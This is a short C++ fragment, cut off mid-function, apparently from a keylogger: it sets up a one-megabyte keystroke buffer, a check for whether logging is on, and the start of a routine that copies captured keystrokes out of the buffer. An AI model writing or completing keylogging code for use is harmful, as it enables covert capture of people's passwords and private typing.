#define KEYLOG_BUFFER_SIZE (1024 * 1024 * 1)

bool IsKeylogging() {
	return isLogging;
}

char* FlushKeylogBuffer(int* length) {
	*length = 0;
	if (i == 0 || KeylogBuffer == 0) return NULL;
	std::lock_guard<std::mutex> guard(m);
	char* newBuffer = (char*)malloc(i + 1);
	newBuffer[i] = 0;
